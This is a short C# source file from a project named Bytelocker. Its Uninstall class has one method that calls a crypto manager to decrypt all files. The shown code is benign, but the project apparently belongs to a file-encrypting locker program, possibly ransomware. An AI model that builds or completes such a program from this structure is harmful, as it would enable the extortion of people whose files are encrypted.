using Bytelocker.CryptoManager;

namespace Bytelocker.Installer
{
    class Uninstall
    {
        public static void decryptAll() 
        {
            CryptoManagerMainHandler cm = new CryptoManagerMainHandler();
            cm.DecryptAll();
        }
    }
}
